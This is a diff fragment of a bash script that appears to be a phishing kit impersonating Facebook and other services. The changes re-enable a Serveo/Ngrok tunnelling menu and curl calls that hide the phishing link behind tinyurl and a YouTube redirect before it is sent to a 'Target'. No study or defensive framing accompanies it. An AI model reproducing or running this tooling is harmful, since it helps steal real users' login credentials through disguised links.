@@ -145,6 +145,7 @@ printf "\n\e[1;92mOkay ...\n\e[0m"
 fi
 server="facebook"
 start1
+
 elif [[ $option == 3 || $option == 03 ]]; then
 printf "\n\e[1;93mWhich you have?\e[0m\n"
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Linux for PC\e[0m          \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Termux for Android\e[0m          \e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Skip for now\e[0m"
@@ -737,7 +738,7 @@ printf "\n"
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
 
 send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$send_link" | head -n1)
-#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
+send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
 printf "\n"
 checkfound
@@ -820,7 +821,7 @@ sleep 10
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link
 send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
-#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
+send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
 printf "\n"
 
@@ -833,23 +834,23 @@ rm -rf sendlink
 fi
 
 
-#printf "\n"
-#printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunneling, Best!)\e[0m\n"
-#printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok (Most Used, Recommended!)\e[0m\n"
-#default_option_server="1"
-#read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
-#option_server="${option_server:-${default_option_server}}"
-#if [[ $option_server == 1 || $option_server == 01 ]]; then
-#startx
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunneling, Best!)\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok (Most Used, Recommended!)\e[0m\n"
+default_option_server="1"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
+option_server="${option_server:-${default_option_server}}"
+if [[ $option_server == 1 || $option_server == 01 ]]; then
+startx
 
-#elif [[ $option_server == 2 || $option_server == 02 ]]; then
+elif [[ $option_server == 2 || $option_server == 02 ]]; then
 start
-#else
-#printf "\e[1;93m [\e[1;91m!\e[1;93m] Invalid option!\e[0m\n"
-#sleep 1
-#clear
-#start1
-#fi
+else
+printf "\e[1;93m [\e[1;91m!\e[1;93m] Invalid option!\e[0m\n"
+sleep 1
+clear
+start1
+fi
 
 }
 checkfound() {
